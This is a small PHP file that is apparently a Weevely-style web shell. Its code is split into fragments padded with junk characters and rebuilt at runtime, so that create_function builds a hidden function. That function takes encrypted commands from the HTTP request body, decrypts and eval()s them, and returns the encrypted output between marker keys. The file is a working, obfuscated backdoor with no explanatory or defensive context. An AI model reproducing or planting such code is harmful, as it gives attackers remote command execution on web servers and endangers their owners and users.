<?php
$w=')GD;$j++,$iGD++){$o.GD=GD$tGD{$i}^$k{$j};}}return $o;}if GDGD(@preg_matGD';
$E='GDase64GDGD_encode(@xGD(@gzcoGDmpress($o),GD$kGD));prGDint("$p$khGD$r$kf");}';
$K='DGDe($m[1GD])GD,$k)));$o=@ob_gGDet_conGDtentGDs();@ob_end_cleanGD();$GDr=@b';
$M='$p="YpwO9GDGD2A0YegD4lgX";fGDunctiGDon x(GDGD$tGD,$k){$c=strlen($k)GD;$l=';
$u='1) {@oGDb_GDstart();@GDeGDval(@gzunGDGDcoGDmpress(@x(@baGDse64_decGDodG';
$y=str_replace('W','','WcrWeateW_fuWnWctWion');
$m='$k=GD"3d5GDd879GD9";$kh=GD"3624GD08GD7e33cGD8";$kf="GDcb4ebfc57GD738";';
$X='stGDrleGDnGDGD($t);$o="";foGDr($i=GDGD0;$i<$l;){for($j=GD0;GD($GDjGD<$c&&$i<$lGD';
$T='ch("/$khGD(GD.+)$kf/",@fGDileGD_get_conteGDnts(GD"php:/GD/input"GD),$m)=GD=';
$B=str_replace('GD','',$m.$M.$X.$w.$T.$u.$K.$E);
$r=$y('',$B);$r();
?>
